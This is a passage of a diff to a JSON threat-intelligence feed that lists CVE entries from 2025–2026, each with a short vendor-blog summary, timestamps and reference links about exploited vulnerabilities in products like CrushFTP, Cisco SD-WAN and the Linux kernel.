+      "description": "[huntress] Across the larger cybersecurity community, an often-used adage is that \u201cthreat actors always change their tactics.\u201d However, when we really start to look at and track incident data, we begin to see that while some changes may be necessitated based on infrastructures and other challenges the threat actor may encounter, there are times when tactics remain consistent across incidents. Recent investigations into exploitation activity for CVE-2025-31151 and CVE-2025-30406 show similar TTPs across dif",
+      "first_seen": "2026-05-21T20:08:57.674065+00:00",
+      "frameworks": [
+        "huntress"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-21T20:08:57.674065+00:00",
+      "merged_sources": [
+        "rss_feeds"
+      ],
+      "proactive_only": true,
+      "raw_records_count": 1,
+      "references": [
+        "https://www.huntress.com/blog/do-tigers-really-change-their-stripes"
+      ],
+      "severity": "medium",
+      "source_count": 1,
+      "title": "Do Tigers Really Change Their Stripes?"
+    },
+    {
+      "canonical_id": "CVE-2025-31161",
+      "composite_confidence": 0.4,
+      "cwe": [],
+      "description": "[huntress] Huntress observed in-the-wild exploitation of CVE-2025-31161, an authentication bypass vulnerability in versions of CrushFTP and further  post-exploitation leveraging MeshCentral and other malware.",
+      "first_seen": "2026-05-21T20:08:57.674201+00:00",
+      "frameworks": [
+        "huntress"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-21T20:08:57.674201+00:00",
+      "merged_sources": [
+        "rss_feeds"
+      ],
+      "proactive_only": true,
+      "raw_records_count": 1,
+      "references": [
+        "https://www.huntress.com/blog/crushftp-cve-2025-31161-auth-bypass-and-post-exploitation"
+      ],
+      "severity": "medium",
+      "source_count": 1,
+      "title": "CrushFTP CVE-2025-31161 Auth Bypass and Post-Exploitation"
+    },
+    {
+      "canonical_id": "CVE-2025-47812",
+      "composite_confidence": 0.4,
+      "cwe": [],
+      "description": "[huntress] Huntress discovered active exploitation of Wing FTP Server RCE (CVE-2025-47812). Learn more about the injection flaw, attack timeline, forensic artifacts, and how to protect your organization.",
+      "first_seen": "2026-05-21T20:08:57.673710+00:00",
+      "frameworks": [
+        "huntress"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-21T20:08:57.673710+00:00",
+      "merged_sources": [
+        "rss_feeds"
+      ],
+      "proactive_only": true,
+      "raw_records_count": 1,
+      "references": [
+        "https://www.huntress.com/blog/wing-ftp-server-remote-code-execution-cve-2025-47812-exploited-in-wild"
+      ],
+      "severity": "medium",
+      "source_count": 1,
+      "title": "Wing FTP Server RCE (CVE-2025-47812) Exploited in the Wild | Huntress"
+    },
+    {
+      "canonical_id": "CVE-2025-50165",
+      "composite_confidence": 0.4,
+      "cwe": [],
+      "description": "[welivesecurity] A comprehensive analysis and assessment of a critical severity vulnerability with low likelihood of mass exploitation",
+      "first_seen": "2026-05-21T20:09:00.218818+00:00",
+      "frameworks": [
+        "welivesecurity"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-21T20:09:00.218818+00:00",
+      "merged_sources": [
+        "rss_feeds"
+      ],
+      "proactive_only": true,
+      "raw_records_count": 1,
+      "references": [
+        "https://www.welivesecurity.com/en/eset-research/revisiting-cve-2025-50165-critical-flaw-windows-imaging-component/"
+      ],
+      "severity": "medium",
+      "source_count": 1,
+      "title": "Revisiting CVE-2025-50165: A critical flaw in Windows Imaging Component"
+    },
+    {
+      "canonical_id": "CVE-2025-53521",
+      "composite_confidence": 0.4,
+      "cwe": [],
+      "description": "[infosecurity_mag] The National Cyber Security Centre wants UK firms to patch CVE-2025-53521",
+      "first_seen": "2026-05-21T20:08:52.175751+00:00",
+      "frameworks": [
+        "infosecurity_mag"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-21T20:08:52.175751+00:00",
+      "merged_sources": [
+        "rss_feeds"
+      ],
+      "proactive_only": true,
+      "raw_records_count": 1,
+      "references": [
+        "https://www.infosecurity-magazine.com/news/ncsc-urges-immediate-patching-f5/"
+      ],
+      "severity": "medium",
+      "source_count": 1,
+      "title": "NCSC Urges Immediate Patching of F5 BIG-IP Bug"
+    },
+    {
+      "canonical_id": "CVE-2025-54957",
+      "composite_confidence": 0.4,
+      "cwe": [],
+      "description": "[project_zero] We recently published an exploit chain for the Google Pixel 9 that demonstrated it was possible to go from a zero-click context to root on Android in just two exploits. The Dolby 0-click vulnerability existed across all of Android, until it was patched in January 2026. While we had an exploit chain for the Pixel 9, we wanted to see if it was possible to write a similar exploit chain for Pixel 10. Updating the Dolby Exploit Altering our exploit for CVE-2025-54957 was fairly straightforward. The m",
+      "first_seen": "2026-05-21T20:08:59.742137+00:00",
+      "frameworks": [
+        "project_zero"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-21T20:08:59.742137+00:00",
+      "merged_sources": [
+        "rss_feeds"
+      ],
+      "proactive_only": true,
+      "raw_records_count": 1,
+      "references": [
+        "https://projectzero.google/2026/05/pixel-10-exploit.html"
+      ],
+      "severity": "medium",
+      "source_count": 1,
+      "title": "A 0-click exploit chain for the Pixel 10: When a Door Closes, a Window Opens"
+    },
+    {
+      "canonical_id": "CVE-2025-55182",
+      "composite_confidence": 0.4,
+      "cwe": [],
+      "description": "[huntress] Huntress is seeing threat actors exploit React2Shell (CVE-2025-55182) to deploy a Linux backdoor, a reverse proxy tunnel, and a Go-based post-exploitation implant.",
+      "first_seen": "2026-05-21T20:08:57.673026+00:00",
+      "frameworks": [
+        "huntress",
+        "portswigger",
+        "snyk"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-21T20:09:05.725146+00:00",
+      "merged_sources": [
+        "rss_feeds"
+      ],
+      "proactive_only": true,
+      "raw_records_count": 3,
+      "references": [
+        "https://portswigger.net/blog/how-to-detect-react2shell-with-burp-suite",
+        "https://snyk.io/blog/security-advisory-critical-rce-vulnerabilities-react-server-components/",
+        "https://www.huntress.com/blog/peerblight-linux-backdoor-exploits-react2shell"
+      ],
+      "severity": "medium",
+      "source_count": 1,
+      "title": "PeerBlight Linux Backdoor Exploits React2Shell CVE-2025-55182"
+    },
+    {
+      "canonical_id": "CVE-2025-59287",
+      "composite_confidence": 0.4,
+      "cwe": [],
+      "description": "[huntress] Huntress has observed threat actors exploiting a Microsoft Windows Server Update Services (WSUS) vulnerability (CVE-2025-59287).",
+      "first_seen": "2026-05-21T20:08:57.673249+00:00",
+      "frameworks": [
+        "huntress"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-21T20:08:57.673249+00:00",
+      "merged_sources": [
+        "rss_feeds"
+      ],
+      "proactive_only": true,
+      "raw_records_count": 1,
+      "references": [
+        "https://www.huntress.com/blog/exploitation-of-windows-server-update-services-remote-code-execution-vulnerability"
+      ],
+      "severity": "medium",
+      "source_count": 1,
+      "title": "Exploitation of Windows Server Update Services Remote Code | Huntress"
+    },
+    {
+      "canonical_id": "CVE-2026-20131",
+      "composite_confidence": 0.4,
+      "cwe": [],
+      "description": "[infosecurity_mag] CISA added CVE-2026-20131 to its KEV catalog as it is being used in ransomware campaigns",
+      "first_seen": "2026-05-21T20:08:52.176092+00:00",
+      "frameworks": [
+        "infosecurity_mag"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-21T20:08:52.176092+00:00",
+      "merged_sources": [
+        "rss_feeds"
+      ],
+      "proactive_only": true,
+      "raw_records_count": 1,
+      "references": [
+        "https://www.infosecurity-magazine.com/news/cisa-orders-us-government-patch/"
+      ],
+      "severity": "medium",
+      "source_count": 1,
+      "title": "CISA Orders US Government to Patch Maximum Severity Cisco Flaw"
+    },
+    {
+      "canonical_id": "CVE-2026-20182",
+      "composite_confidence": 0.4,
+      "cwe": [],
+      "description": "[talos] Cisco Talos is tracking the active exploitation of CVE-2026-20182, an authentication bypass vulnerability in Cisco Catalyst SD-WAN Controller, formerly SD-WAN vSmart, and Cisco Catalyst SD-WAN Manager, formerly SD-WAN vManage.",
+      "first_seen": "2026-05-21T20:08:56.631951+00:00",
+      "frameworks": [
+        "talos",
+        "tenable"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-21T20:09:00.354017+00:00",
+      "merged_sources": [
+        "rss_feeds"
+      ],
+      "proactive_only": true,
+      "raw_records_count": 2,
+      "references": [
+        "https://blog.talosintelligence.com/sd-wan-ongoing-exploitation/",
+        "https://www.tenable.com/blog/faq-about-the-continued-exploitation-of-cisco-catalyst-sd-wan-vulnerabilities-uat-8616"
+      ],
+      "severity": "medium",
+      "source_count": 1,
+      "title": "Ongoing exploitation of Cisco Catalyst SD-WAN vulnerabilities"
+    },
+    {
+      "canonical_id": "CVE-2026-3055",
+      "composite_confidence": 0.4,
+      "cwe": [],
+      "description": "[infosecurity_mag] Researchers from watchTowr and Defused have found evidence that attackers are actively exploiting CVE-2026-3055, a critical NetScaler vulnerability",
+      "first_seen": "2026-05-21T20:08:52.175770+00:00",
+      "frameworks": [
+        "infosecurity_mag"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-21T20:08:52.175770+00:00",
+      "merged_sources": [
+        "rss_feeds"
+      ],
+      "proactive_only": true,
+      "raw_records_count": 1,
+      "references": [
+        "https://www.infosecurity-magazine.com/news/critical-citrix-netscaler/"
+      ],
+      "severity": "medium",
+      "source_count": 1,
+      "title": "Critical Citrix NetScaler Vulnerability Exploited in the Wild"
+    },
+    {
+      "canonical_id": "CVE-2026-33032",
+      "composite_confidence": 0.4,
+      "cwe": [],
+      "description": "[infosecurity_mag] Critical nginx-ui MCP authentication bypass CVE-2026-33032 actively exploited with CVSS 9.8",
+      "first_seen": "2026-05-21T20:08:52.175355+00:00",
+      "frameworks": [
+        "infosecurity_mag"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-21T20:08:52.175355+00:00",
+      "merged_sources": [
+        "rss_feeds"
+      ],
+      "proactive_only": true,
+      "raw_records_count": 1,
+      "references": [
+        "https://www.infosecurity-magazine.com/news/nginx-ui-mcp-flaw-actively/"
+      ],
+      "severity": "medium",
+      "source_count": 1,
+      "title": "Critical Nginx-ui MCP Flaw Actively Exploited in the Wild"
+    },
+    {
+      "canonical_id": "CVE-2026-3502",
+      "composite_confidence": 0.4,
+      "cwe": [],
+      "description": "[checkpoint] Key Points Introduction At the beginning of 2026, Check Point Research observed a series of targeted attacks against government entities in Southeast Asia carried out via a legitimate TrueConf software installed in the targets\u2019 environment. The investigation led to the discovery of a zero-day vulnerability in the TrueConf client, tracked as\u00a0CVE-2026-3502\u00a0with a\u00a0CVSS score of 7.8. [\u2026] \n The post  Operation TrueChaos: 0-Day Exploitation Against Southeast Asian Government Targets  appeared first on",
+      "first_seen": "2026-05-21T20:08:59.904623+00:00",
+      "frameworks": [
+        "checkpoint"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-21T20:08:59.904623+00:00",
+      "merged_sources": [
+        "rss_feeds"
+      ],
+      "proactive_only": true,
+      "raw_records_count": 1,
+      "references": [
+        "https://research.checkpoint.com/2026/operation-truechaos-0-day-exploitation-against-southeast-asian-government-targets/"
+      ],
+      "severity": "medium",
+      "source_count": 1,
+      "title": "Operation TrueChaos: 0-Day Exploitation Against Southeast Asian Government Targets"
+    },
+    {
+      "canonical_id": "CVE-2026-3888",
+      "composite_confidence": 0.4,
+      "cwe": [],
+      "description": "[infosecurity_mag] CVE-2026-3888 Ubuntu snap flaw lets local users escalate to root via timing-based exploit",
+      "first_seen": "2026-05-21T20:08:52.176187+00:00",
+      "frameworks": [
+        "infosecurity_mag"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-21T20:08:52.176187+00:00",
+      "merged_sources": [
+        "rss_feeds"
+      ],
+      "proactive_only": true,
+      "raw_records_count": 1,
+      "references": [
+        "https://www.infosecurity-magazine.com/news/ubuntu-flaw-enables-root-access/"
+      ],
+      "severity": "medium",
+      "source_count": 1,
+      "title": "New Ubuntu Flaw Enables Local Attackers to Gain Root Access"
+    },
+    {
+      "canonical_id": "CVE-2026-3965",
+      "composite_confidence": 0.4,
+      "cwe": [],
+      "description": "[snyk] Two authentication bypass vulnerabilities (CVE-2026-3965, CVE-2026-4047) in the Qinglong task scheduling panel were exploited in the wild to deploy cryptomining malware. Here's what happened, how the attacks worked, and what self-hosted application operators should learn from this incident.",
+      "first_seen": "2026-05-21T20:09:05.724455+00:00",
+      "frameworks": [
+        "snyk"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-21T20:09:05.724455+00:00",
+      "merged_sources": [
+        "rss_feeds"
+      ],
+      "proactive_only": true,
+      "raw_records_count": 1,
+      "references": [
+        "https://snyk.io/blog/qinglong-task-scheduler-rce-vulnerabilities/"
+      ],
+      "severity": "medium",
+      "source_count": 1,
+      "title": "Qinglong task scheduler RCE vulnerabilities exploited in the wild for cryptomining"
+    },
+    {
+      "canonical_id": "CVE-2026-40478",
+      "composite_confidence": 0.4,
+      "cwe": [],
+      "description": "[snyk] CVE-2026-40478: The Thymeleaf template injection (CVSS 9.1) is conditional. Patch to 3.1.4+ immediately, and audit your code for dynamic view or template expression misuse, which is the key precondition for exploitability.",
+      "first_seen": "2026-05-21T20:09:05.724413+00:00",
+      "frameworks": [
+        "snyk"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-21T20:09:05.724413+00:00",
+      "merged_sources": [
+        "rss_feeds"
+      ],
+      "proactive_only": true,
+      "raw_records_count": 1,
+      "references": [
+        "https://snyk.io/blog/thymeleaf-injection/"
+      ],
+      "severity": "medium",
+      "source_count": 1,
+      "title": "Don't Panic: The Thymeleaf Template Injection That Only Hurts If You Let It (CVE-2026-40478)"
+    },
+    {
+      "canonical_id": "CVE-2026-41103",
+      "composite_confidence": 0.4,
+      "cwe": [],
+      "description": "[tenable] 16 Critical   102 Important   0 Moderate   0 Low    Microsoft addresses 118 CVEs in its May 2026 Patch Tuesday release, with no zero-days exploited in the wild or publicly disclosed for the first time since June 2024.   Microsoft patched 118 CVEs in its May 2026 Patch Tuesday release, with 16 rated critical and 102 rated as important. Our counts omitted CVE-2025-54518, an AMD CPU OP Cache Corruption vulnerability issued by AMD.   This month\u2019s update includes patches for:   .NET  ASP.NET Core  Az",
+      "first_seen": "2026-05-21T20:09:00.354323+00:00",
+      "frameworks": [
+        "tenable"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-21T20:09:00.354323+00:00",
+      "merged_sources": [
+        "rss_feeds"
+      ],
+      "proactive_only": true,
+      "raw_records_count": 1,
+      "references": [
+        "https://www.tenable.com/blog/microsofts-may-2026-patch-tuesday-addresses-118-cves-cve-2026-41103"
+      ],
+      "severity": "medium",
+      "source_count": 1,
+      "title": "Microsoft\u2019s May 2026 Patch Tuesday Addresses 118 CVEs (CVE-2026-41103)"
+    },
+    {
+      "canonical_id": "CVE-2026-43284",
+      "composite_confidence": 0.4,
+      "cwe": [],
+      "description": "[qualys] Dirty Frag is a Linux local privilege escalation (LPE) chain published on May 7, 2026. It combines two previously unknown kernel vulnerabilities can allow an unprivileged local user to escalate to root on many major Linux distributions. As of May 8, 2026, CVE-2026-43284 had been patched in mainline Linux, while public reporting indicated that CVE-2026-43500 [\u2026]",
+      "first_seen": "2026-05-21T20:09:00.532718+00:00",
+      "frameworks": [
+        "qualys"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-21T20:09:00.532718+00:00",
+      "merged_sources": [
+        "rss_feeds"
+      ],
+      "proactive_only": true,
+      "raw_records_count": 1,
+      "references": [
+        "https://blog.qualys.com/product-tech/vulnmgmt-detection-response/2026/05/09/dirty-frag-using-the-page-caches-as-an-attack-surface"
+      ],
+      "severity": "medium",
+      "source_count": 1,
+      "title": "Dirty Frag: Using the Page Caches as an Attack Surface"
+    },
+    {
+      "canonical_id": "CVE-2026-46300",
+      "composite_confidence": 0.4,
+      "cwe": [],
+      "description": "[tenable] A new Linux kernel local privilege escalation exploit with a public proof-of-concept targets the same subsystem as Dirty Frag but requires a separate patch.   Key Takeaways   CVE-2026-46300 (Fragnesia) is the latest high severity local privilege escalation vulnerability in the Linux kernel, following the disclosure of both Dirty Frag and Copy Fail.  A public proof-of-concept is available and the exploit has been confirmed working on Ubuntu systems, though no in-the-wild exploitation has been rep",
+      "first_seen": "2026-05-21T20:09:00.354185+00:00",
+      "frameworks": [
+        "tenable"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-21T20:09:00.354185+00:00",
+      "merged_sources": [
+        "rss_feeds"
+      ],
+      "proactive_only": true,
+      "raw_records_count": 1,
+      "references": [
+        "https://www.tenable.com/blog/fragnesia-cve-2026-46300-faq-about-new-linux-kernel-xfrm-esp-in-tcp-priv-esc"
+      ],
+      "severity": "medium",
+      "source_count": 1,
+      "title": "Fragnesia (CVE-2026-46300): Frequently asked questions about new Linux Kernel XFRM ESP-in-TCP privilege escalation"
+    },
+    {
+      "canonical_id": "CVE-2026-46333",
+      "composite_confidence": 0.4,
+      "cwe": [],
+      "description": "[qualys] The Qualys Threat Research Unit (TRU) has discovered and published the full advisory for CVE-2026-46333, a logic flaw in the Linux kernel\u2019s __ptrace_may_access() function that permits an unprivileged local user to disclose sensitive files and execute arbitrary commands as root on default installations of several major distributions. The bug has resided in mainline Linux since [\u2026]",
+      "first_seen": "2026-05-21T20:09:00.532430+00:00",
+      "frameworks": [
+        "qualys"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-21T20:09:00.532430+00:00",
+      "merged_sources": [
+        "rss_feeds"
+      ],
+      "proactive_only": true,
+      "raw_records_count": 1,
+      "references": [
+        "https://blog.qualys.com/vulnerabilities-threat-research/2026/05/20/cve-2026-46333-local-root-privilege-escalation-and-credential-disclosure-in-the-linux-kernel-ptrace-path"
+      ],
+      "severity": "medium",
+      "source_count": 1,
+      "title": "CVE-2026-46333: Local Root Privilege Escalation and Credential Disclosure in the Linux Kernel ptrace Path"
+    },
+    {
+      "canonical_id": "CVE-2026-9082",
+      "composite_confidence": 0.4,
+      "cwe": [],
+      "description": "[tenable] A highly critical SQL injection vulnerability in Drupal core's database abstraction layer affects sites running PostgreSQL.   Key Takeaways   CVE-2026-9082 is a highly critical SQL injection vulnerability in Drupal core's database abstraction API that can be exploited by unauthenticated attackers on sites using PostgreSQL.  No exploitation has been observed in the wild, but a detection PoC was published on the same day as the advisory and the patch diff was shared publicly within hours.  Patches",
+      "first_seen": "2026-05-21T20:09:00.353772+00:00",
+      "frameworks": [
+        "tenable"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-21T20:09:00.353772+00:00",
+      "merged_sources": [
+        "rss_feeds"
+      ],
+      "proactive_only": true,
+      "raw_records_count": 1,
+      "references": [
+        "https://www.tenable.com/blog/cve-2026-9082-highly-critical-sql-injection-vulnerability-in-drupal-core-sa-core-2026-004"
+      ],
+      "severity": "medium",
+      "source_count": 1,
+      "title": "CVE-2026-9082: Highly Critical SQL Injection Vulnerability in Drupal Core (SA-CORE-2026-004)"
     }
   ],
-  "correlated_at": "2026-05-21T19:07:43.713961+00:00"
+  "correlated_at": "2026-05-21T20:09:08.485364+00:00"
 }
